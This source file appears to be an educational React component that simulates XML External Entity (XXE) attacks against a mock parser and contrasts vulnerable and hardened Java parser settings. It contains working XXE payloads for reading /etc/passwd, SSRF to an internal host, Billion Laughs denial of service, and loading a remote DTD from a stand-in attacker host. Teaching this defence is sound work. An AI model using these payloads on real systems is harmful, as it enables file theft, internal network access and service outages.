import React, { useState } from 'react';
import { FileCode, AlertTriangle, Shield, Play, Upload } from 'lucide-react';

const XXEDemo: React.FC = () => {
  const [xmlInput, setXmlInput] = useState('');
  const [isVulnerable, setIsVulnerable] = useState(true);
  const [parsingResult, setParsingResult] = useState('');
  const [showEntityExpansion, setShowEntityExpansion] = useState(false);

  const xxeExamples = [
    {
      name: 'Basic File Read',
      payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
  <email>user@example.com</email>
</user>`
    },
    {
      name: 'SSRF Attack',
      payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "http://internal-server:8080/admin">
]>
<user>
  <name>&xxe;</name>
  <email>user@example.com</email>
</user>`
    },
    {
      name: 'Billion Laughs (DoS)',
      payload: `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>`
    },
    {
      name: 'Parameter Entity',
      payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE user [
  <!ENTITY % evil SYSTEM "http://attacker.com/evil.dtd">
  %evil;
]>
<user>
  <name>test</name>
</user>`
    }
  ];

  const mockFileSystem = {
    '/etc/passwd': `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
admin:x:1000:1000:Admin User:/home/admin:/bin/bash`,
    '/etc/hosts': `127.0.0.1   localhost
192.168.1.100   admin-panel.internal
10.0.0.5   database.internal`,
    'http://internal-server:8080/admin': `HTTP/1.1 200 OK
Content-Type: text/html

<html>
<head><title>Internal Admin Panel</title></head>
<body>
<h1>Internal Administration</h1>
<p>Secret admin interface accessible only from internal network</p>
<ul>
<li>Database Password: db_secret_123</li>
<li>API Keys: api_key_xyz789</li>
</ul>
</body>
</html>`
  };

  const parseXML = (xml: string) => {
    if (!xml.trim()) {
      setParsingResult('');
      return;
    }

    try {
      if (isVulnerable) {
        // Simulate vulnerable XML parser
        let result = xml;
        
        // Check for entity references and expand them
        const entityMatches = xml.match(/<!ENTITY\s+(\w+)\s+SYSTEM\s+"([^"]+)">/g);
        if (entityMatches) {
          entityMatches.forEach(match => {
            const entityMatch = match.match(/<!ENTITY\s+(\w+)\s+SYSTEM\s+"([^"]+)">/);
            if (entityMatch) {
              const entityName = entityMatch[1];
              const systemId = entityMatch[2];
              
              // Simulate reading from system
              if (mockFileSystem[systemId as keyof typeof mockFileSystem]) {
                const content = mockFileSystem[systemId as keyof typeof mockFileSystem];
                result = result.replace(new RegExp(`&${entityName};`, 'g'), content);
              } else {
                result = result.replace(new RegExp(`&${entityName};`, 'g'), `[Error: Cannot access ${systemId}]`);
              }
            }
          });
        }

        // Handle billion laughs expansion
        if (xml.includes('<!ENTITY lol') && xml.includes('&lol4;')) {
          result = 'ERROR: Parser terminated - Exponential entity expansion detected (DoS protection triggered)';
          setShowEntityExpansion(true);
        }

        setParsingResult(result);
      } else {
        // Simulate secure XML parser (entities disabled)
        const parser = new DOMParser();
        const xmlDoc = parser.parseFromString(xml, 'text/xml');
        
        const error = xmlDoc.querySelector('parsererror');
        if (error) {
          setParsingResult('Parse Error: External entities disabled for security');
        } else {
          // Extract text content safely
          const userElement = xmlDoc.querySelector('user');
          if (userElement) {
            const name = userElement.querySelector('name')?.textContent || '';
            const email = userElement.querySelector('email')?.textContent || '';
            setParsingResult(`Parsed safely:\nName: ${name}\nEmail: ${email}\n\nNote: External entities were ignored for security.`);
          } else {
            setParsingResult('XML parsed successfully (external entities disabled)');
          }
        }
      }
    } catch (error) {
      setParsingResult(`Parse Error: ${error instanceof Error ? error.message : 'Unknown error'}`);
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    parseXML(xmlInput);
  };

  return (
    <div className="space-y-6">
      {/* Controls */}
      <div className="flex items-center justify-between">
        <div className="flex items-center space-x-4">
          <div className="flex items-center space-x-2">
            <input
              type="checkbox"
              id="vulnerable"
              checked={isVulnerable}
              onChange={(e) => setIsVulnerable(e.target.checked)}
              className="rounded border-gray-600 bg-gray-700 text-cyan-500 focus:ring-cyan-500"
            />
            <label htmlFor="vulnerable" className="text-sm font-medium">
              External Entities Enabled
            </label>
          </div>
          <div className={`px-3 py-1 rounded-full text-xs font-medium ${
            isVulnerable 
              ? 'bg-red-500/20 text-red-400 border border-red-500/30'
              : 'bg-green-500/20 text-green-400 border border-green-500/30'
          }`}>
            {isVulnerable ? 'VULNERABLE' : 'PROTECTED'}
          </div>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Input Section */}
        <div className="space-y-4">
          <div className="bg-gray-700 rounded-lg p-4">
            <h4 className="font-semibold mb-3 flex items-center">
              <Upload className="w-4 h-4 text-cyan-400 mr-2" />
              XML Input
            </h4>
            
            <form onSubmit={handleSubmit} className="space-y-3">
              <textarea
                value={xmlInput}
                onChange={(e) => setXmlInput(e.target.value)}
                placeholder="Enter XML content..."
                className="w-full h-48 px-3 py-2 bg-gray-800 border border-gray-500 rounded-md text-white font-mono text-sm resize-none focus:outline-none focus:ring-2 focus:ring-cyan-500"
              />
              <button
                type="submit"
                className="flex items-center space-x-2 px-4 py-2 bg-cyan-600 text-white rounded-md hover:bg-cyan-700 transition-colors"
              >
                <Play className="w-4 h-4" />
                <span>Parse XML</span>
              </button>
            </form>

            <div className="mt-4">
              <h5 className="text-sm font-medium text-gray-300 mb-2">XXE Payload Examples:</h5>
              <div className="space-y-2">
                {xxeExamples.map((example, index) => (
                  <div key={index} className="bg-gray-800 border border-gray-600 rounded p-3">
                    <div className="flex justify-between items-center mb-2">
                      <span className="text-sm font-medium text-yellow-400">{example.name}</span>
                      <button
                        onClick={() => setXmlInput(example.payload)}
                        className="text-xs px-2 py-1 bg-gray-600 text-white rounded hover:bg-gray-500 transition-colors"
                      >
                        Use This
                      </button>
                    </div>
                    <code className="text-xs text-gray-400 font-mono block whitespace-pre-wrap">
                      {example.payload.substring(0, 100)}...
                    </code>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>

        {/* Output Section */}
        <div className="space-y-4">
          <div className="bg-gray-700 rounded-lg p-4">
            <h4 className="font-semibold mb-3 flex items-center">
              <FileCode className="w-4 h-4 text-green-400 mr-2" />
              Parser Output
            </h4>
            
            <div className="bg-gray-800 rounded-lg p-4 min-h-48">
              {parsingResult ? (
                <div>
                  <div className="text-sm text-gray-400 mb-2">XML Parsing Result:</div>
                  <pre className="text-sm text-white whitespace-pre-wrap bg-black p-3 rounded border overflow-auto max-h-64">
                    {parsingResult}
                  </pre>
                  {parsingResult.includes('root:x:') && (
                    <div className="mt-2 p-2 bg-red-900/30 border border-red-700/50 rounded text-sm text-red-300">
                      🚨 Critical: System password file exposed via XXE!
                    </div>
                  )}
                  {parsingResult.includes('Database Password') && (
                    <div className="mt-2 p-2 bg-red-900/30 border border-red-700/50 rounded text-sm text-red-300">
                      🚨 Critical: Internal server data leaked via SSRF!
                    </div>
                  )}
                  {parsingResult.includes('DoS protection triggered') && (
                    <div className="mt-2 p-2 bg-orange-900/30 border border-orange-700/50 rounded text-sm text-orange-300">
                      ⚠️ Warning: Billion Laughs attack detected and blocked!
                    </div>
                  )}
                </div>
              ) : (
                <div className="text-gray-500 text-sm italic">
                  No XML parsed yet. Enter XML above and click Parse XML.
                </div>
              )}
            </div>

            {/* Entity Expansion Visualization */}
            {showEntityExpansion && (
              <div className="mt-4 bg-orange-900/30 border border-orange-700/50 rounded-lg p-3">
                <h5 className="font-medium text-orange-400 mb-2">Billion Laughs Expansion:</h5>
                <div className="text-xs font-mono text-orange-300 space-y-1">
                  <div>lol = "lol" (3 chars)</div>
                  <div>lol2 = lol × 10 = 30 chars</div>
                  <div>lol3 = lol2 × 8 = 240 chars</div>
                  <div>lol4 = lol3 × 8 = 1,920 chars</div>
                  <div className="text-orange-200">Expansion grows exponentially!</div>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>

      {/* Code Comparison */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        <div className="bg-red-900/30 border border-red-700/50 rounded-lg p-4">
          <h5 className="text-red-400 font-medium text-sm mb-3">Vulnerable Code:</h5>
          <code className="text-xs font-mono text-red-300 block bg-gray-800 p-3 rounded">
            {`// Dangerous: External entities enabled
DocumentBuilderFactory factory = 
    DocumentBuilderFactory.newInstance();
// No security configuration!
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(xmlInput);`}
          </code>
        </div>

        <div className="bg-green-900/30 border border-green-700/50 rounded-lg p-4">
          <h5 className="text-green-400 font-medium text-sm mb-3">Secure Code:</h5>
          <code className="text-xs font-mono text-green-300 block bg-gray-800 p-3 rounded">
            {`// Safe: Disable external entities
DocumentBuilderFactory factory = 
    DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
DocumentBuilder builder = factory.newDocumentBuilder();`}
          </code>
        </div>
      </div>

      {/* Educational Content */}
      <div className="bg-blue-900/30 border border-blue-700/50 rounded-lg p-6">
        <h4 className="font-semibold text-blue-400 mb-3">Understanding XXE Attacks</h4>
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 text-sm">
          <div>
            <h5 className="font-medium text-blue-300 mb-2">Attack Types:</h5>
            <ul className="text-blue-200 space-y-1">
              <li>• File disclosure</li>
              <li>• SSRF (Server-Side Request Forgery)</li>
              <li>• Denial of Service (Billion Laughs)</li>
              <li>• Port scanning</li>
              <li>• Remote code execution (rare)</li>
            </ul>
          </div>
          <div>
            <h5 className="font-medium text-blue-300 mb-2">Common Targets:</h5>
            <ul className="text-blue-200 space-y-1">
              <li>• Configuration files</li>
              <li>• Password files</li>
              <li>• Internal services</li>
              <li>• Cloud metadata APIs</li>
              <li>• Network resources</li>
            </ul>
          </div>
          <div>
            <h5 className="font-medium text-blue-300 mb-2">Prevention:</h5>
            <ul className="text-blue-200 space-y-1">
              <li>• Disable external entities</li>
              <li>• Use safe XML parsers</li>
              <li>• Input validation</li>
              <li>• Whitelist allowed DTDs</li>
              <li>• Network restrictions</li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  );
};

export default XXEDemo;